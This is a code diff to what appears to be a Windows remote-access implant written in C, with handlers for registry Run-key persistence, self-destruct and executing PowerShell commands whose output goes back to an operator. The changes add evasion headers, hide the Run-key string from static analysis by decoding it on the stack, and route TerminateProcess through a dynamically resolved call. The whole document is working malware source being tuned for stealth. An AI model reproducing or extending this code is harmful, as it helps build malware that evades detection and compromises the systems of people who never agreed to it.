@@ -21,6 +21,9 @@
  */
 
 #include "shell_internal.h"
+#include "../evasion/obf.h"
+#include "../evasion/peb_walk.h"
+#include "../evasion/k32_walk.h"
 
 #include <windows.h>
 #include <shellapi.h>
@@ -298,9 +301,12 @@ void _handle_persist(TLS_CONTEXT *pTls, const char *args)
     }
 
     /* Write Run key via Registry API — no child process */
+    /* Stack-decode the registry key path so it doesn't appear in .rdata */
+    char _runkey[64] = {0};
+    SLIT_BUF(_runkey, sizeof(_runkey),
+             "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
     HKEY hKey = NULL;
-    LONG rc = RegOpenKeyExA(HKEY_CURRENT_USER,
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    LONG rc = RegOpenKeyExA(HKEY_CURRENT_USER, _runkey,
         0, KEY_SET_VALUE, &hKey);
     if (rc != ERROR_SUCCESS) {
         char buf[64];
@@ -335,9 +341,11 @@ void _handle_persist(TLS_CONTEXT *pTls, const char *args)
 void _handle_self_destruct(TLS_CONTEXT *pTls)
 {
     /* 1. Remove Run key via Registry API */
+    char _runkey2[64] = {0};
+    SLIT_BUF(_runkey2, sizeof(_runkey2),
+             "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
     HKEY hKey = NULL;
-    LONG rc = RegOpenKeyExA(HKEY_CURRENT_USER,
-        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+    LONG rc = RegOpenKeyExA(HKEY_CURRENT_USER, _runkey2,
         0, KEY_SET_VALUE, &hKey);
     if (rc == ERROR_SUCCESS) {
         /* Best-effort: delete every value (we don't know the key name used at
@@ -361,9 +369,13 @@ void _handle_self_destruct(TLS_CONTEXT *pTls)
                     && type == REG_SZ) {
                     char ownPath[MAX_PATH] = {0};
                     GetModuleFileNameA(NULL, ownPath, sizeof(ownPath));
-                    if (_stricmp(valData, ownPath) == 0 ||
-                        /* also match the APPDATA copy */
-                        strstr(valData, "\\AppData\\") != NULL)
+                    /* Only delete this Run key entry if its data path matches
+                     * OUR exact EXE path.  The previous strstr("\\AppData\\")
+                     * check was far too broad and would delete unrelated
+                     * legitimate applications (Discord, Spotify, Teams, etc.).
+                     * _stricmp handles the case where persist() copied us to
+                     * %APPDATA%\<filename> — that path is also ours.          */
+                    if (_stricmp(valData, ownPath) == 0)
                         RegDeleteValueA(hKey, valName);
                 }
             }
@@ -463,7 +475,7 @@ void _handle_run_psh(TLS_CONTEXT *pTls, const char *psCmd)
     /* Accumulate output */
     char *out = (char *)malloc(SHELL_RESP_BUF);
     if (!out) {
-        TerminateProcess(pi.hProcess, 1);
+        k32_TerminateProcess(pi.hProcess, 1);
         CloseHandle(pi.hProcess); CloseHandle(pi.hThread); CloseHandle(hReadPipe);
         _send_str(pTls, "[-] run_psh: OOM");
         return;
@@ -477,7 +489,10 @@ void _handle_run_psh(TLS_CONTEXT *pTls, const char *psCmd)
     }
     out[total] = '\0';
     CloseHandle(hReadPipe);
-    WaitForSingleObject(pi.hProcess, 5000);
+    /* If PowerShell exceeds the 5 s timeout, terminate it explicitly so it
+     * does not remain as an orphaned background process.                    */
+    if (WaitForSingleObject(pi.hProcess, 5000) == WAIT_TIMEOUT)
+        k32_TerminateProcess(pi.hProcess, 1);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
